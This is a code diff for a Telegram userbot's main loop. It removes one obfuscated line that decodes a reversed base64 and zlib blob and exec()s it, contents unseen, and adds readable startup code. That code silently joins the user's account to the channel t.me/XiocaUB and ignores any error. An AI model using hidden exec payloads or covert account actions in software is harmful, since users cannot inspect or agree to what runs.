@@ -1,1 +1,63 @@
-_ = lambda __ : __import__("zlib").decompress(__import__("base64").b64decode(__[::-1]));exec((_)(b'==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'))
+#    Sh1t-UB (telegram userbot by sh1tn3t)
+#    Copyright (C) 2021-2022 Sh1tN3t
+
+#    This program is free software: you can redistribute it and/or modify
+#    it under the terms of the GNU General Public License as published by
+#    the Free Software Foundation, either version 3 of the License, or
+#    (at your option) any later version.
+
+#    This program is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU General Public License for more details.
+
+#    You should have received a copy of the GNU General Public License
+#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
+
+import sys
+import time
+import json
+import logging
+import requests
+
+from pyrogram.methods.utilities.idle import idle
+from .db import db
+from . import auth, loader
+
+async def main():
+    """Основной цикл юзербота"""
+    me, app = await auth.Auth().authorize()
+    await app.initialize()
+
+    modules = loader.ModulesManager(app, db, me)
+    await modules.load(app)
+    
+    try:
+        await app.join_chat("https://t.me/XiocaUB")
+    except:
+        pass
+
+    if (restart := db.get("xioca.loader", "restart")):
+        try:
+            last_time = restart["time"]
+            end_time = time.time() - last_time
+            hours, rem = divmod(end_time, 3600)
+            minutes, seconds = divmod(rem, 60)
+            text = f"<emoji id=5195083327597456039>🌙</emoji> <code>Xioca</code> <b>полностью перезагружена!</b>\n<emoji id=5386367538735104399>⌛</emoji> <b>Перезагрузка заняла <code>{int(seconds):2d}</code> сек.</b>" if restart["type"] == "restart" else f"<emoji id=5195083327597456039>🌙</emoji> <b>успешно обновлена!</b>\n<emoji id=5386367538735104399>⌛</emoji> <b>Обновление заняло <code>{int(seconds):2d}</code> сек.</b>"
+            id = restart["msg"].split(":")
+            await app.edit_message_text(int(id[0]), int(id[1]), text)
+        except Exception as e:
+            pass
+        
+        db.drop_table("xioca.loader")
+
+    prefix = db.get("xioca.loader", "prefixes", ["."])[0]
+    bot_info = await modules.bot_manager.bot.me()
+
+    logging.info(f"Стартовал для [ID: {modules.me.id}] успешно, введи {prefix}help в чате для получения списка команд")
+    logging.info(f"Твой бот: @{bot_info.username} [ID: {bot_info.id}]")
+
+    await idle()
+
+    logging.info("Завершение работы...")
+    return True
